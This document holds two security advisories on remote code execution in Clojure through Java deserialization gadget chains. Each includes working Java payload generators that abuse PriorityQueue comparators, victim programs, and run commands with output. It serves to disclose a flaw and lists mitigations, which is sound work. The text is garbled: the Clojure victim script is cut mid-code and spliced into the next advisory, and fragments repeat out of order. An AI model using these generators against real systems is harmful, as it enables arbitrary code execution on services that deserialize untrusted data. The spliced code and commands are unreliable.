GHSA-q527-rxcp-97g8.description: ### Summary When a serialized input containing `clojure.lang.FnLoaderThunk` is deserialized via [`java.io.ObjectInputStream.readObject()`](https://docs.oracle.com/en/java/docs/api/java.base/java/io/ObjectInputStream.html#readObject()), an attacker is able to achieve remote code execution. Applications that use a broad `ObjectInputFilter` admitting the `clojure.lang.*` package prefix are vulnerable to remote code execution when they deserialize attacker-controlled Java objects. A crafted `java.util.PriorityQueue` whose comparator is a `clojure.lang.FnLoaderThunk` wired to `clojure.core/apply` triggers `(apply eval [<attacker-form>])` automatically inside `ObjectInputStream.readObject()`, before any application-level validation can run. The filter bypass works because the dangerous capability (live references to `clojure.core/apply` and `clojure.core/eval`) is acquired from the victim JVM's running namespace via `Var$Serialized.readResolve`, not deserialized from the attacker's bytes. Every class in the 14-class object graph belongs to `java.util` or `clojure.lang`; all are approved by name before the chain fires. ### Details #### Object graph The serialized payload is a `PriorityQueue` with two fields populated by reflection (bypassing normal insertion to avoid triggering the comparator in the generator JVM): ``` java.util.PriorityQueue ├── comparator: clojure.lang.FnLoaderThunk │ ├── fn: Var identity → clojure.core/apply │ └── loader: null (forces fn field path in FnLoaderThunk.compare) └── queue[2] ├── [0]: Var identity → clojure.core/eval └── [1]: PersistentList → (<attacker-controlled-form>) ``` The stream does not contain any compiled function bytecode. It contains only: - Class names from `java.util` and `clojure.lang` - Two Var identities (namespace + symbol strings) - Clojure data structures (lists, vectors, symbols, strings) representing the form #### Exploit prerequisites The exploit requires all four of the following conditions in the victim application: 1. **Attacker-controlled bytes reach `ObjectInputStream.readObject()`**, via HTTP, a message queue, a cache, an RMI endpoint, or any other transport. 2. **The `ObjectInputFilter` admits the described class set**, specifically `PriorityQueue`, object arrays, `String`, and any class in `clojure.lang.*`. This is a common pattern for Clojure services that attempt to restrict deserialization by package prefix. 3. **`clojure.core` is initialized**, normal for any running Clojure application. 4. **No exact-class allowlist blocks `PriorityQueue`, `FnLoaderThunk`, `AFunction`, or `Var`.** #### Gadget chain ``` ObjectInputStream.readObject() → Var$Serialized.readResolve() — reconnects eval and apply from victim namespace → PriorityQueue.readObject() → heapify() → siftDownUsingComparator() → Comparator.compare(eval-var, eval-arguments) → AFunction.compare(o1, o2) — casts result to Number → FnLoaderThunk.invoke(o1, o2) — delegates to fn field → apply.invoke(eval, [form]) → Compiler.eval(form) — arbitrary code execution ``` The form that `Compiler.eval` receives is whatever `PersistentList` of Clojure data the attacker embedded in the payload. This can invoke any Java API reachable from the victim JVM, with the full authority of the deserializing process. #### Why `AFunction.compare` must return a `Number` `AFunction.compare(o1, o2)` calls `invoke(o1, o2)` and immediately casts the result to `Number` to call `intValue()`. If the form returns `null` (e.g., from a bare `ProcessBuilder` call without a `let` binding), the cast throws `NullPointerException` and the chain aborts before producing any observable effect. A correct payload must ensure its form returns a numeric value. ### PoC A two-JVM proof of concept is included in this advisory: - `GadgetGenerator.java`: builds and serializes the payload in a separate JVM with `--add-opens=java.base/java.util=ALL-UNNAMED`. Uses `/usr/bin/touch` as a safe canary. - `PocVictimApp.clj`: deserializes the payload through the vulnerable package-prefix filter. Runs without `--add-opens`; `GadgetGenerator` must be absent from the classpath. **The generator class is absent from the consumer classpath and serialized stream.** Quick run (requires Clojure sources compiled to a `CLASSPATH`): ```sh DEMO=$(mktemp -d /tmp/clojure-deser-XXXXXX) # Generator JVM: needs --add-opens to write to PriorityQueue internals java --add-opens=java.base/java.util=ALL-UNNAMED \ -cp '$CLASSPATH:generator-classes' \ GadgetGenerator '$DEMO/payload.bin' '$DEMO/marker' # Consumer: Clojure script — no --add-opens; no generator class on classpath java -cp '$CLASSPATH' clojure.main PocVictimApp.clj \ '$DEMO/payload.bin' '$DEMO/marker' ``` Expected consumer output: ``` restored-root: java.util.PriorityQueue filter-seen: [java.util.PriorityQueue, clojure.lang.FnLoaderThunk, ...] marker-created: true exit-code: 0 VERIFIED: gadget executed during ObjectInputStream.readObject() ``` ### Impact Remote Code Execution. Any program on the JVM may read serialized objects via [`java.io.ObjectInputStream.readObject()`](https://docs.oracle.com/en/java/docs/api/java.base/java/io/ObjectInputStream.html#readObject()). Reading serialized objects from an untrusted source is **inherently unsafe** and is a prerequisite for this vulnerability. ### Mitigation Mitigate this via one of the following: * Do not deserialize data from untrusted sources, this is inherently dangerous. * Per the Java guidelines on [deserialization filtering](https://docs.oracle.com/en/java/javase/17/core/serialization-filtering1.html#GUID-55BABE96-3048-4A9F-A7E6-781790FF3480), configure either a JVM-level or stream-specific [ObjectInputFilter](https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/ObjectInputFilter.html) to reject the class `clojure.lang.FnLoaderThunk`. * Use Clojure ≥ 1.12.6 where FnLoaderThunk will throw on both serialization and deserialization, preventing this gadget from working. ### Scripts - GadgetGenerator.java ```java import clojure.lang.FnLoaderThunk; import clojure.lang.PersistentList; import clojure.lang.PersistentVector; import clojure.lang.RT; import clojure.lang.Symbol; import clojure.lang.Var; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.LinkOption; import java.nio.file.Path; import java.nio.file.StandardOpenOption; import java.util.Comparator; import java.util.List; import java.util.PriorityQueue; /** * Proof-of-concept payload generator for the Clojure filtered-deserialization RCE finding. * * Builds a PriorityQueue whose comparator is a FnLoaderThunk delegating to * clojure.core/apply, with queue elements [#'clojure.core/eval, [form]]. * * During deserialization on the victim side, PriorityQueue.readObject() calls * heapify(), which calls siftDownUsingComparator(), which calls Comparator.compare(). * That call chains through FnLoaderThunk → apply → eval → attacker form. * * Canary effect: the form runs `/usr/bin/touch <marker>`, captures the exit code, * writes it to the marker file, and returns it as an Integer — satisfying the * Number cast in AFunction.compare(). The consumer verifies the marker was created * and its content is '0'. * * Requires: --add-opens=java.base/java.util=ALL-UNNAMED (generator JVM only). * The consumer JVM needs no special flags. */ public final class GadgetGenerator { private GadgetGenerator() {} private static Field field(Class<?> type, String name) throws Exception { Field f = type.getDeclaredField(name); f.setAccessible(true); return f; } private static Path checkedTemporaryPath(String raw) throws Exception { Path requested = Path.of(raw).toAbsolutePath().normalize(); Path fileName = requested.getFileName(); Path parent = requested.getParent(); if (fileName == null || parent == null || !Files.isDirectory(parent)) { throw new IllegalArgumentException('path must be below an existing directory: ' + raw); } Path temporaryRoot = Path.of('/tmp').toRealPath(); Path realParent = parent.toRealPath(); if (!realParent.startsWith(temporaryRoot)) { throw new IllegalArgumentException('path must remain below /tmp: ' + raw); } return realParent.resolve(fileName.toString()); } private static void refuseExisting(Path path, String label) { if (Files.exists(path, LinkOption.NOFOLLOW_LINKS)) { throw new IllegalStateException('refusing to overwrite existing ' + label + ': ' + path); } } /** * Builds the gadget object graph without invoking the comparator in this JVM. * * The form structure: * (let [exit-code (.waitFor (.start (ProcessBuilder. ['/usr/bin/touch' marker])))] * (clojure.core/spit marker (clojure.core/str exit-code)) * exit-code) * * The let binding is required: AFunction.compare casts the comparator result to Number. * A form that returns nil (e.g. a bare ProcessBuilder call) causes NullPointerException * at the cast and the chain aborts without producing any observable effect. */ @SuppressWarnings({'rawtypes', 'unchecked'}) static PriorityQueue<Object> buildGadget(Path marker) throws Exception { Var apply = RT.var('clojure.core', 'apply'); Var eval = RT.var('clojure.core', 'eval'); FnLoaderThunk comparator = new FnLoaderThunk(apply, 'unused'); field(FnLoaderThunk.class, 'loader').set(comparator, null); field(FnLoaderThunk.class, 'fn').set(comparator, apply); Object command = PersistentVector.create('/usr/bin/touch', marker.toString()); Object processBuilder = PersistentList.create(List.of( Symbol.intern('java.lang.ProcessBuilder.'), command)); Object start = PersistentList.create(List.of(Symbol.intern('.start'), processBuilder)); Object waitFor = PersistentList.create(List.of(Symbol.intern('.waitFor'), start)); Symbol exitCode = Symbol.intern('exit-code'); Object bindings = PersistentVector.create(exitCode, waitFor); Object exitCodeStr = PersistentList.create(List.of(Symbol.intern('clojure.core/str'), exitCode)); Object spit = PersistentList.create(List.of(Symbol.intern('clojure.core/spit'), marker.toString(), exitCodeStr)); Object form = PersistentList.create(List.of(Symbol.intern('let'), bindings, spit, exitCode)); Object evalArgs = PersistentList.create(List.of(form)); // Populate the queue's private internals directly to avoid triggering // heapify (and thus the gadget) in this JVM during element insertion. PriorityQueue<Object> queue = new PriorityQueue<>(2, (Comparator) comparator); field(PriorityQueue.class, 'queue').set(queue, new Object[]{eval, evalArgs}); field(PriorityQueue.class, 'size').setInt(queue, 2); return queue; } public static void main(String[] args) throws Exception { if (args.length != 2) { System.err.println('usage: GadgetGenerator PAYLOAD_PATH MARKER_PATH'); System.err.println(' Both paths must be below /tmp.'); System.exit(1); } Path payload = checkedTemporaryPath(args[0]); Path marker = checkedTemporaryPath(args[1]); refuseExisting(payload, 'payload'); refuseExisting(marker, 'marker'); PriorityQueue<Object> gadget = buildGadget(marker); try (ObjectOutputStream out = new ObjectOutputStream( Files.newOutputStream(payload, StandardOpenOption.CREATE_NEW, StandardOpenOption.WRITE))) { out.writeObject(gadget); } System.out.println('generated: ' + payload); System.out.println('payload-bytes: ' + Files.size(payload)); System.out.println('serialized-comparator: ' + gadget.comparator().getClass().getName()); System.out.println('delegate-var: #'clojure.core/apply'); System.out.println('element-var: #'clojure.core/eval'); System.out.println('marker-exists-now: ' + Files.exists(marker)); } } ``` - PocVictimApp.clj ```clj ;;; Proof-of-concept victim application. ;;; ;;; Demonstrates that a broad clojure.lang.* package-prefix ObjectInputFilter ;;; does not prevent gadget chain execution. Deserializes the payload produced ;;; by GadgetGenerator.java through the vulnerable filter and asserts the canary ;;; marker was created with exit code 0. ;;; ;;; Run (no --add-opens required; generator class must be absent from classpath): ;;; java -cp '$CLASSPATH' clojure.main PocVictimApp.clj PAYLOAD_PATH MARKER_PATH ;;; ;;; Where CLASSPATH contains the compiled Clojure checkout sources and support JARs. (str 'path must be below an existing directory: ' raw)))) (let [tmp-root (.toRealPath (path-of '/tmp') (make-array LinkOption 0)) real-parent (.toRealPath parent (make-array LinkOption 0))] (when-not (.startsWith real-parent tmp-root) (throw (IllegalArgumentException. (str 'refusing to overwrite existing marker: ' marker)))) (let [seen (java.util.LinkedHashSet.) restored (with-open [in (ObjectInputStream. GHSA-x4c4-68gp-vrhc.title: Deserialization of Untrusted Data Allows Remote Code Execution
GHSA-x4c4-68gp-vrhc.description: ### Summary Compiled Clojure functions implement `java.util.Comparator`, and `AFunction.compare` runs the function. A serialized `java.util.PriorityQueue` whose comparator is `clojure.core/apply` and whose elements are `clojure.core/load-string` and a string of Clojure source executes that source during `ObjectInputStream.readObject`, using only classes in `clojure.jar` and the JDK. Reproduced on 1.10.3, 1.11.1, 1.12.4, 1.12.6, and 1.13.0-alpha11, independent of `*read-eval*`. ### Details ### Root cause `clojure.lang.AFunction`, the base class of every compiled Clojure function, implements `java.util.Comparator`, and its `compare` runs the function before interpreting the result: ``` src/jvm/clojure/lang/AFunction.java:18 public abstract class AFunction extends AFn implements IObj, Comparator, Fn, Serializable { src/jvm/clojure/lang/AFunction.java:52-53 public int compare(Object o1, Object o2){ Object o = invoke(o1, o2); // the function executes here ... ``` `javap` on the 1.12.6 release shows this is unchanged by the fix: ``` $ javap -cp clojure-1.12.6.jar clojure.lang.AFunction public abstract class clojure.lang.AFunction extends clojure.lang.AFn implements clojure.lang.IObj, java.util.Comparator, clojure.lang.Fn, java.io.Serializable { public int compare(java.lang.Object, java.lang.Object); ``` Two functions shipped in `clojure.jar` complete the chain: ``` src/clj/clojure/core.clj:663-668 apply -> (. f (applyTo (seq args))) src/clj/clojure/core.clj:4136-4144 load-string -> load-reader -> clojure.lang.Compiler.eval ``` `java.util.PriorityQueue` is serializable, and its `readObject` rebuilds the heap with the comparator: ``` java.util.PriorityQueue.readObject -> heapify -> siftDownUsingComparator -> comparator.compare(e0, e1) ``` With `comparator = apply` and `queue = [load-string, ['<source>']]`, the comparison `compare(load-string, ['<source>'])` becomes `(apply load-string ['<source>'])`, which is `(load-string '<source>')`, which hands the source to the compiler. ### Proof of concept The gadget is composed entirely of classes shipped in `clojure.jar` (`clojure.lang.AFunction` via `clojure.core/apply` and `clojure.core/load-string`, and `clojure.lang.PersistentVector`) together with `java.util.PriorityQueue` from the JDK. No application code, third-party library, or modified class is required. The victim performs a single `ObjectInputStream.readObject` call. Two files are used: a builder that produces the payload, and a victim that deserializes it. ### Builder ```java import clojure.java.api.Clojure; import clojure.lang.IDeref; import clojure.lang.PersistentVector; import java.io.*; import java.lang.reflect.Field; import java.util.Comparator; import java.util.PriorityQueue; public class BuildPayload { static Object fn(String ns, String name) { return ((IDeref) Clojure.var(ns, name)).deref(); } static void setField(Object t, String n, Object v) throws Exception { Field f = t.getClass().getDeclaredField(n); f.setAccessible(true); f.set(t, v); } public static void main(String[] args) throws Exception { // Attacker-supplied source: runs the OS command `id`, records it, returns a number so the // comparator result is well formed and deserialization completes quietly. String code = '(do (require (quote clojure.java.shell))' + ' (spit \'/tmp/proof.txt\'' + ' (str \'code execution during ObjectInputStream.readObject | id=\'' + ' (:out ((resolve (quote clojure.java.shell/sh)) \'id\')))) 0)'; Object apply = fn('clojure.core', 'apply'); // comparator Object loadString = fn('clojure.core', 'load-string'); // queue element 0 Field cache = Class.forName('clojure.lang.AFunction').getField('__methodImplCache'); cache.set(apply, null); cache.set(loadString, null); // not serializable; clear if set PersistentVector arg = PersistentVector.create(new Object[]{ code }); // element 1 -> ['<source>'] PriorityQueue pq = new PriorityQueue(2, (Comparator) apply); setField(pq, 'queue', new Object[]{ loadString, arg }); // set directly so build does not compare setField(pq, 'size', 2); try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream('payload.ser'))) { oos.writeObject(pq); } System.out.println('payload.ser (' + new File('payload.ser').length() + ' bytes)'); } } ``` ### Victim ```java import java.io.*; public class Victim { public static void main(String[] args) throws Exception { String file = args.length > 0 ? args[0] : 'payload.ser'; File proof = new File('/tmp/proof.txt'); proof.delete(); System.out.println('before readObject: /tmp/proof.txt exists = ' + proof.exists()); try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(file))) { ois.readObject(); } catch (Throwable t) { System.out.println('readObject raised ' + t.getClass().getName() + ' (after the code ran)'); } System.out.println('after readObject: /tmp/proof.txt exists = ' + proof.exists()); if (proof.exists()) try (BufferedReader r = new BufferedReader(new FileReader(proof))) { System.out.println('proof: ' + r.readLine()); } } } ``` ### Build and run The payload is built once. The `--add-opens` flag is required only to populate the queue's backing array by reflection while generating the bytes, and applies only to the builder. A serialization stream written directly, using standard serialization-gadget stream-writing techniques, needs no reflection (not shown here). The victim runs with a stock JVM and no flags. ``` $ javac -cp '$(clojure -Spath)' BuildPayload.java Victim.java $ java --add-opens java.base/java.util=ALL-UNNAMED -cp '$(clojure -Spath):.' BuildPayload payload.ser (922 bytes) ``` Run against 1.12.6, the newest stable release: ``` $ java -cp '$(clojure -Sdeps '{:deps {org.clojure/clojure {:mvn/version '1.12.6'}}}' -Spath):.' Victim payload.ser runtime: 1.12.6 | java: 25.0.2 before readObject: /tmp/proof.txt exists = false after readObject: /tmp/proof.txt exists = true proof: code execution during ObjectInputStream.readObject | id=uid=501(neo) gid=20(staff) groups=20(staff),12(everyone),... ``` Run against 1.13.0-alpha11, the latest development release: ``` $ java -cp '$(clojure -Sdeps '{:deps {org.clojure/clojure {:mvn/version '1.13.0-alpha11'}}}' -Spath):.' Victim payload.ser runtime: 1.13.0-alpha11 | java: 25.0.2 before readObject: /tmp/proof.txt exists = false after readObject: /tmp/proof.txt exists = true proof: code execution during ObjectInputStream.readObject | id=uid=501(neo) gid=20(staff) groups=... ``` Before deserialization the proof file does not exist. After one `readObject`, it exists and holds the output of the OS command `id`. The deserialized value is an ordinary `PriorityQueue`, so the attack leaves no obvious trace. The same payload was reproduced on 1.10.3, 1.11.1, 1.12.4, 1.12.6, and 1.13.0-alpha11. ### Reproduction in a clean environment The payload was reproduced in a freshly provisioned, isolated environment to rule out any local configuration. An Ubuntu 26.04 container with no prior Clojure present was given only an official Clojure installation, using the `linux-install.sh` script from `clojure.org/guides/install_clojure` (Clojure CLI 1.12.6.1673), running `org.clojure/clojure` 1.12.6 on OpenJDK 25. Only the payload and the victim were copied in, with an identical SHA-256 on both sides. The stock victim deserialized the payload and the embedded command executed, recording the environment's own identity (`uid=0(root)`), which confirms execution inside the clean environment, on the patched release, through plain `ObjectInputStream.readObject` with no flags and no serialization filter. ### Call stack during `readObject` ``` clojure.lang.Compiler.eval(Compiler.java:7757) clojure.lang.Compiler.load(Compiler.java:8170) clojure.core$load_string.invoke(core.clj:4115) clojure.core$apply.invokeStatic(core.clj:667) clojure.lang.AFunction.compare(AFunction.java:53) java.base/java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:712) java.base/java.util.PriorityQueue.heapify(PriorityQueue.java:734) java.base/java.util.PriorityQueue.readObject(PriorityQueue.java:801) java.base/java.io.ObjectInputStream.readObject(ObjectInputStream.java:445) ``` This stack was captured on a 1.12.x run, where `load-string` appears at `core.clj:4115`. In the 1.13.0-master tree cited above it is defined at `core.clj:4136`. `apply` (`core.clj:667`) and `AFunction.compare` (`AFunction.java:53`) match the cited tree. ### Mitigation Mitigate this via one of the following: * Do not deserialize data from untrusted sources, this is inherently dangerous. * Per the Java guidelines on [deserialization filtering](https://docs.oracle.com/en/java/javase/17/core/serialization-filtering1.html#GUID-55BABE96-3048-4A9F-A7E6-781790FF3480), configure either a JVM-level or stream-specific [ObjectInputFilter](https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/ObjectInputFilter.html) to reject the class clojure.lang.AFunction. * Use Clojure 1.12.7 which makes Clojure functions throw on serialization and deserialization by default ### Impact Any application that calls `ObjectInputStream.readObject` on attacker-controlled bytes with `clojure.jar` on the classpath is exposed to remote code execution, shown here by running the OS command `id`. The chain needs only `clojure.jar` and the JDK, with no application classes and no victim-side namespace state. The one precondition is that the application deserializes attacker-controlled data. It is not stopped by the default (absent) serialization filter, nor by an `ObjectInputFilter` allowlist that admits all Clojure classes (`clojure.**`), because the function objects are `clojure.core$apply` and `clojure.core$load_string` (JVM package `clojure`). Denying `clojure.lang.AFunction` does stop it, as described under Mitigation. It is independent of `*read-eval*`, because it reaches the compiler through `load-string` rather than the reader. Java deserialization sinks appear in RMI, JMX, object caches and session stores, and message brokers that carry serialized Java objects.

Two files are used: a builder that produces the payload, and a victim that deserializes it. ### Builder ```java import clojure.java.api.Clojure; import clojure.lang.IDeref; import clojure.lang.PersistentVector; import java.io.*; import java.lang.reflect.Field; import java.util.Comparator; import java.util.PriorityQueue; public class BuildPayload { static Object fn(String ns, String name) { return ((IDeref) Clojure.var(ns, name)).deref(); } static void setField(Object t, String n, Object v) throws Exception { Field f = t.getClass().getDeclaredField(n); f.setAccessible(true); f.set(t, v); } public static void main(String[] args) throws Exception { // Attacker-supplied source: runs the OS command `id`, records it, returns a number so the // comparator result is well formed and deserialization completes quietly. The `--add-opens` flag is required only to populate the queue's backing array by reflection while generating the bytes, and applies only to the builder. A serialization stream written directly, using standard serialization-gadget stream-writing techniques, needs no reflection (not shown here). The victim runs with a stock JVM and no flags. ``` $ javac -cp '$(clojure -Spath)' BuildPayload.java Victim.java $ java --add-opens java.base/java.util=ALL-UNNAMED -cp '$(clojure -Spath):.' Victim payload.ser runtime: 1.12.6 | java: 25.0.2 before readObject: /tmp/proof.txt exists = false after readObject: /tmp/proof.txt exists = true proof: code execution during ObjectInputStream.readObject | id=uid=501(neo) gid=20(staff) groups=20(staff),12(everyone),... ``` Run against 1.13.0-alpha11, the latest development release: ``` $ java -cp '$(clojure -Sdeps '{:deps {org.clojure/clojure {:mvn/version '1.13.0-alpha11'}}}' -Spath):.' In the 1.13.0-master tree cited above it is defined at `core.clj:4136`. `apply` (`core.clj:667`) and `AFunction.compare` (`AFunction.java:53`) match the cited tree. ### Mitigation Mitigate this via one of the following: * Do not deserialize data from untrusted sources, this is inherently dangerous. * Per the Java guidelines on [deserialization filtering](https://docs.oracle.com/en/java/javase/17/core/serialization-filtering1.html#GUID-55BABE96-3048-4A9F-A7E6-781790FF3480), configure either a JVM-level or stream-specific [ObjectInputFilter](https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/ObjectInputFilter.html) to reject the class clojure.lang.AFunction. * Use Clojure 1.12.7 which makes Clojure functions throw on serialization and deserialization by default ### Impact Any application that calls `ObjectInputStream.readObject` on attacker-controlled bytes with `clojure.jar` on the classpath is exposed to remote code execution, shown here by running the OS command `id`. The chain needs only `clojure.jar` and the JDK, with no application classes and no victim-side namespace state. The one precondition is that the application deserializes attacker-controlled data. It is not stopped by the default (absent) serialization filter, nor by an `ObjectInputFilter` allowlist that admits all Clojure classes (`clojure.**`), because the function objects are `clojure.core$apply` and `clojure.core$load_string` (JVM package `clojure`). Denying `clojure.lang.AFunction` does stop it, as described under Mitigation. It is independent of `*read-eval*`, because it reaches the compiler through `load-string` rather than the reader. Java deserialization sinks appear in RMI, JMX, object caches and session stores, and message brokers that carry serialized Java objects.

GHSA-x4c4-68gp-vrhc.title: Deserialization of Untrusted Data Allows Remote Code Execution
GHSA-x4c4-68gp-vrhc.description: ### Summary Compiled Clojure functions implement `java.util.Comparator`, and `AFunction.compare` runs the function. A serialized `java.util.PriorityQueue` whose comparator is `clojure.core/apply` and whose elements are `clojure.core/load-string` and a string of Clojure source executes that source during `ObjectInputStream.readObject`, using only classes in `clojure.jar` and the JDK. Reproduced on 1.10.3, 1.11.1, 1.12.4, 1.12.6, and 1.13.0-alpha11, independent of `*read-eval*`. ### Details ### Root cause `clojure.lang.AFunction`, the base class of every compiled Clojure function, implements `java.util.Comparator`, and its `compare` runs the function before interpreting the result: ``` src/jvm/clojure/lang/AFunction.java:18 public abstract class AFunction extends AFn implements IObj, Comparator, Fn, Serializable { src/jvm/clojure/lang/AFunction.java:52-53 public int compare(Object o1, Object o2){ Object o = invoke(o1, o2); // the function executes here ... ``` `javap` on the 1.12.6 release shows this is unchanged by the fix: ``` $ javap -cp clojure-1.12.6.jar clojure.lang.AFunction public abstract class clojure.lang.AFunction extends clojure.lang.AFn implements clojure.lang.IObj, java.util.Comparator, clojure.lang.Fn, java.io.Serializable { public int compare(java.lang.Object, java.lang.Object); ``` Two functions shipped in `clojure.jar` complete the chain: ``` src/clj/clojure/core.clj:663-668 apply -> (. f (applyTo (seq args))) src/clj/clojure/core.clj:4136-4144 load-string -> load-reader -> clojure.lang.Compiler.eval ``` `java.util.PriorityQueue` is serializable, and its `readObject` rebuilds the heap with the comparator: ``` java.util.PriorityQueue.readObject -> heapify -> siftDownUsingComparator -> comparator.compare(e0, e1) ``` With `comparator = apply` and `queue = [load-string, ['<source>']]`, the comparison `compare(load-string, ['<source>'])` becomes `(apply load-string ['<source>'])`, which is `(load-string '<source>')`, which hands the source to the compiler. ### Proof of concept The gadget is composed entirely of classes shipped in `clojure.jar` (`clojure.lang.AFunction` via `clojure.core/apply` and `clojure.core/load-string`, and `clojure.lang.PersistentVector`) together with `java.util.PriorityQueue` from the JDK. No application code, third-party library, or modified class is required. The victim performs a single `ObjectInputStream.readObject` call. Two files are used: a builder that produces the payload, and a victim that deserializes it. ### Builder ```java import clojure.java.api.Clojure; import clojure.lang.IDeref; import clojure.lang.PersistentVector; import java.io.*; import java.lang.reflect.Field; import java.util.Comparator; import java.util.PriorityQueue; public class BuildPayload { static Object fn(String ns, String name) { return ((IDeref) Clojure.var(ns, name)).deref(); } static void setField(Object t, String n, Object v) throws Exception { Field f = t.getClass().getDeclaredField(n); f.setAccessible(true); f.set(t, v); } public static void main(String[] args) throws Exception { // Attacker-supplied source: runs the OS command `id`, records it, returns a number so the // comparator result is well formed and deserialization completes quietly. String code = '(do (require (quote clojure.java.shell))' + ' (spit \'/tmp/proof.txt\'' + ' (str \'code execution during ObjectInputStream.readObject | id=\'' + ' (:out ((resolve (quote clojure.java.shell/sh)) \'id\')))) 0)'; Object apply = fn('clojure.core', 'apply'); // comparator Object loadString = fn('clojure.core', 'load-string'); // queue element 0 Field cache = Class.forName('clojure.lang.AFunction').getField('__methodImplCache'); cache.set(apply, null); cache.set(loadString, null); // not serializable; clear if set PersistentVector arg = PersistentVector.create(new Object[]{ code }); // element 1 -> ['<source>'] PriorityQueue pq = new PriorityQueue(2, (Comparator) apply); setField(pq, 'queue', new Object[]{ loadString, arg }); // set directly so build does not compare setField(pq, 'size', 2); try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream('payload.ser'))) { oos.writeObject(pq); } System.out.println('payload.ser (' + new File('payload.ser').length() + ' bytes)'); } } ``` ### Victim ```java import java.io.*; public class Victim { public static void main(String[] args) throws Exception { String file = args.length > 0 ? args[0] : 'payload.ser'; File proof = new File('/tmp/proof.txt'); proof.delete(); System.out.println('before readObject: /tmp/proof.txt exists = ' + proof.exists()); try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(file))) { ois.readObject(); } catch (Throwable t) { System.out.println('readObject raised ' + t.getClass().getName() + ' (after the code ran)'); } System.out.println('after readObject: /tmp/proof.txt exists = ' + proof.exists()); if (proof.exists()) try (BufferedReader r = new BufferedReader(new FileReader(proof))) { System.out.println('proof: ' + r.readLine()); } } } ``` ### Build and run The payload is built once. The `--add-opens` flag is required only to populate the queue's backing array by reflection while generating the bytes, and applies only to the builder. A serialization stream written directly, using standard serialization-gadget stream-writing techniques, needs no reflection (not shown here). The victim runs with a stock JVM and no flags. ``` $ javac -cp '$(clojure -Spath)' BuildPayload.java Victim.java $ java --add-opens java.base/java.util=ALL-UNNAMED -cp '$(clojure -Spath):.' BuildPayload payload.ser (922 bytes) ``` Run against 1.12.6, the newest stable release: ``` $ java -cp '$(clojure -Sdeps '{:deps {org.clojure/clojure {:mvn/version '1.12.6'}}}' -Spath):.' Victim payload.ser runtime: 1.12.6 | java: 25.0.2 before readObject: /tmp/proof.txt exists = false after readObject: /tmp/proof.txt exists = true proof: code execution during ObjectInputStream.readObject | id=uid=501(neo) gid=20(staff) groups=20(staff),12(everyone),... ``` Run against 1.13.0-alpha11, the latest development release: ``` $ java -cp '$(clojure -Sdeps '{:deps {org.clojure/clojure {:mvn/version '1.13.0-alpha11'}}}' -Spath):.' Victim payload.ser runtime: 1.13.0-alpha11 | java: 25.0.2 before readObject: /tmp/proof.txt exists = false after readObject: /tmp/proof.txt exists = true proof: code execution during ObjectInputStream.readObject | id=uid=501(neo) gid=20(staff) groups=... ``` Before deserialization the proof file does not exist. After one `readObject`, it exists and holds the output of the OS command `id`. The deserialized value is an ordinary `PriorityQueue`, so the attack leaves no obvious trace. The same payload was reproduced on 1.10.3, 1.11.1, 1.12.4, 1.12.6, and 1.13.0-alpha11. ### Reproduction in a clean environment The payload was reproduced in a freshly provisioned, isolated environment to rule out any local configuration. An Ubuntu 26.04 container with no prior Clojure present was given only an official Clojure installation, using the `linux-install.sh` script from `clojure.org/guides/install_clojure` (Clojure CLI 1.12.6.1673), running `org.clojure/clojure` 1.12.6 on OpenJDK 25. Only the payload and the victim were copied in, with an identical SHA-256 on both sides. The stock victim deserialized the payload and the embedded command executed, recording the environment's own identity (`uid=0(root)`), which confirms execution inside the clean environment, on the patched release, through plain `ObjectInputStream.readObject` with no flags and no serialization filter. ### Call stack during `readObject` ``` clojure.lang.Compiler.eval(Compiler.java:7757) clojure.lang.Compiler.load(Compiler.java:8170) clojure.core$load_string.invoke(core.clj:4115) clojure.core$apply.invokeStatic(core.clj:667) clojure.lang.AFunction.compare(AFunction.java:53) java.base/java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:712) java.base/java.util.PriorityQueue.heapify(PriorityQueue.java:734) java.base/java.util.PriorityQueue.readObject(PriorityQueue.java:801) java.base/java.io.ObjectInputStream.readObject(ObjectInputStream.java:445) ``` This stack was captured on a 1.12.x run, where `load-string` appears at `core.clj:4115`. In the 1.13.0-master tree cited above it is defined at `core.clj:4136`. `apply` (`core.clj:667`) and `AFunction.compare` (`AFunction.java:53`) match the cited tree. ### Mitigation Mitigate this via one of the following: * Do not deserialize data from untrusted sources, this is inherently dangerous. * Per the Java guidelines on [deserialization filtering](https://docs.oracle.com/en/java/javase/17/core/serialization-filtering1.html#GUID-55BABE96-3048-4A9F-A7E6-781790FF3480), configure either a JVM-level or stream-specific [ObjectInputFilter](https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/ObjectInputFilter.html) to reject the class clojure.lang.AFunction. * Use Clojure 1.12.7 which makes Clojure functions throw on serialization and deserialization by default ### Impact Any application that calls `ObjectInputStream.readObject` on attacker-controlled bytes with `clojure.jar` on the classpath is exposed to remote code execution, shown here by running the OS command `id`. The chain needs only `clojure.jar` and the JDK, with no application classes and no victim-side namespace state. The one precondition is that the application deserializes attacker-controlled data. It is not stopped by the default (absent) serialization filter, nor by an `ObjectInputFilter` allowlist that admits all Clojure classes (`clojure.**`), because the function objects are `clojure.core$apply` and `clojure.core$load_string` (JVM package `clojure`). Denying `clojure.lang.AFunction` does stop it, as described under Mitigation. It is independent of `*read-eval*`, because it reaches the compiler through `load-string` rather than the reader. Java deserialization sinks appear in RMI, JMX, object caches and session stores, and message brokers that carry serialized Java objects.
